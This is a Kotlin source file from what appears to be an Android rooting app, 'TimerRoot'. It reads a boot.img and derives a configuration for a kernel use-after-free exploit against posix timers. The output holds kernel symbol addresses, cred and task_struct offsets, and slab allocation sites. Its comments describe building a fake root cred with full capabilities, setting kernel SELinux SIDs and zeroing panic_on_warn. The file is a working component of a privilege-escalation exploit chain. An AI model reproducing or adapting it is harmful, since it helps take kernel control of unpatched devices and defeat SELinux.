package com.kpgc.timerroot.ota

/**
 * 在设备上从 boot.img 推导 TimerRoot 用的 conf。
 *
 * 只依赖 [BootImageParser]（carve / LZ4-legacy / gzip / BTF / call site）和
 * [KallsymsExtractor]，两者都是纯 JVM 实现 —— 不需要 NDK、不需要 root、不需要联网。
 *
 * Java 侧通过反射调用（构建时没有 Kotlin 编译器也能出 APK，只是按钮会提示不可用），
 * 所以对外只有 [derive] 一个静态方法：
 *
 *   成功 → conf 全文（第一行是注释，不会以 "ERR:" 开头）
 *   失败 → "ERR: <中文说明>"
 */
object Deriver {

    /** 与 Python 版 `cve98260_auto.py` 生成的格式保持一致，便于互相对拍。 */
    @JvmStatic
    fun derive(bootImgPath: String): String {
        return try {
            val f = java.io.File(bootImgPath)
            if (!f.isFile) {
                "ERR: 找不到文件 $bootImgPath"
            } else {
                build(BootImageParser().parse(f.readBytes()))
            }
        } catch (t: Throwable) {
            "ERR: 解析失败：" + (t.message ?: t.javaClass.simpleName)
        }
    }

    private fun tail(notes: List<String>): String =
        if (notes.isEmpty()) "" else "（" + notes.joinToString("；") + "）"

    private fun build(info: BootImageParser.ExtractedKernelInfo): String {
        val rel = info.release
            ?: return "ERR: 没找到 linux_banner —— 不像 arm64 内核镜像，或者不是 boot/vendor_boot 格式"
        if (info.sites?.patched == true) {
            return "ERR: 这颗内核已修补 CVE-2026-98260（存在 posixtimer_exec，" +
                    "或 posix_cpu_timers_exit 早于 exec_mmap 写锁），链不可用"
        }
        val sym = info.symbols
            ?: return "ERR: kallsyms 提取失败" + tail(info.notes)
        val so = info.structOffsets
            ?: return "ERR: 镜像里没有 BTF（CONFIG_DEBUG_INFO_BTF 关了），结构偏移推不出来" + tail(info.notes)
        val ts = so.taskStruct ?: return "ERR: BTF 里没有 task_struct"
        val cred = so.cred ?: return "ERR: BTF 里没有 cred"
        val sites = info.sites ?: return "ERR: call site 扫描失败" + tail(info.notes)
        val timer = sites.timerLink
            ?: return "ERR: 没扫到 do_timer_create 里的 kmem_cache_alloc"
        val task = sites.taskAllocLink
            ?: return "ERR: 没扫到 copy_process 里的 kmem_cache_alloc_node"
        val credSize = info.credLayout?.size ?: return "ERR: BTF 里没有 cred 的大小"
        val kitimer = so.kItimerSize ?: return "ERR: BTF 里没有 k_itimer 的大小"

        fun need(name: String): Long =
            sym[name] ?: throw IllegalStateException("缺符号 $name（kallsyms 里查不到）")

        val selinux = need("selinux_state")
        val rootUser = need("root_user")
        val userNs = need("init_user_ns")
        val ucounts = need("init_ucounts")
        val groups = need("init_groups")
        // panic_on_warn 在部分内核里是 static，符号可能不在 kallsyms；缺了只是 fake 路线风险高
        val pow = sym["panic_on_warn"]

        // cred_jar 带 SLAB_HWCACHE_ALIGN，arm64 的 cache line 是 64 字节
        val credAlloc = (credSize + 63) / 64 * 64
        val blob = info.tsecExecSid ?: 8L

        val sb = StringBuilder()
        sb.append("# TimerUAF kernel profile (HOCON; JSON remains valid)\n")
        sb.append("# 由 TimerRoot 在设备上从 boot.img 推导（kallsyms + 反汇编 + BTF）\n")
        sb.append("# 机型未知，镜像 sha256 前 16 位: ").append(info.imageSha256.take(16))
            .append("，解压后 ").append(info.imageBytes).append(" 字节\n")
        sb.append("#\n")
        if (pow == null) {
            sb.append("#   没找到 panic_on_warn 符号：fake 路线在 panic_on_warn=1 的机器上会 panic\n")
        }
        sb.append('\n')
        sb.append("release = \"").append(rel).append("\"\n")
        sb.append("schema_version = 1\n")
        sb.append("ksu_kmi = \"").append(kmiOf(rel)).append("\"\n")
        sb.append('\n')
        sb.append("# do_timer_create 里 bl kmem_cache_alloc(posix_timers) 的返回地址\n")
        sb.append("timer_site = ").append(hx(timer)).append('\n')
        sb.append("# sizeof(struct k_itimer)；posix_timers 没开 HWCACHE_ALIGN，不向上取整\n")
        sb.append("timer_alloc = ").append(hx(kitimer)).append('\n')
        sb.append('\n')
        sb.append("# cred_jar 带 SLAB_HWCACHE_ALIGN：req=sizeof(cred)，alloc 对齐到 64\n")
        sb.append("cred_req = ").append(hx(credSize)).append('\n')
        sb.append("cred_alloc = ").append(hx(credAlloc)).append('\n')
        sb.append("# 6.1 的 usage 是 4 字节 -> uid@4；6.6/6.12 是 8 字节 -> uid@8\n")
        sb.append("cred_uid_off = ").append(hx(cred.uid)).append('\n')
        sb.append('\n')
        sb.append("# 链接期符号（_text 基址 + 偏移），运行期靠 trace 里的调用点算 slide\n")
        sb.append("selinux_state = ").append(hx(selinux)).append('\n')
        if (pow != null) {
            sb.append("# fake 路线会撞一次 WARN_ON_ONCE，这个地址必须能清零\n")
            sb.append("panic_on_warn = ").append(hx(pow)).append('\n')
        }
        sb.append('\n')
        sb.append("# task_struct / cred 布局（BTF）\n")
        sb.append("task_cred_off = ").append(hx(ts.cred)).append('\n')
        sb.append("# copy_process 里 bl kmem_cache_alloc_node(task_struct) 的返回地址低 21 位\n")
        sb.append("copy_process_low21 = ").append(hx(task and 0x1FFFFFL)).append('\n')
        sb.append("task_alloc_bytes = ").append(hx(ts.size)).append('\n')
        sb.append('\n')
        sb.append("# fake cred 里要填的 refcounted 子对象\n")
        sb.append("fullcap = 0x1ffffffffff\n")
        sb.append("root_user = ").append(hx(rootUser)).append('\n')
        sb.append("init_user_ns = ").append(hx(userNs)).append('\n')
        sb.append("init_ucounts = ").append(hx(ucounts)).append('\n')
        sb.append("init_groups = ").append(hx(groups)).append('\n')
        sb.append('\n')
        sb.append("# task_security_struct：四个 sid 槽位都写 SECINITSID_KERNEL\n")
        sb.append("selinux_blob_off = ").append(hx(blob)).append('\n')
        sb.append("selinux_sid_kernel = 1\n")
        return sb.toString()
    }

    private fun hx(v: Long): String = "0x" + java.lang.Long.toHexString(v)

    /** 6.1.157-android14-11-o-ga43993466696 → android14-6.1 */
    private fun kmiOf(release: String): String {
        val m = Regex("^(\\d+)\\.(\\d+)\\.").find(release) ?: return "android14-6.1"
        val a = Regex("android(\\d+)").find(release) ?: return "android14-6.1"
        return "android" + a.groupValues[1] + "-" + m.groupValues[1] + "." + m.groupValues[2]
    }
}
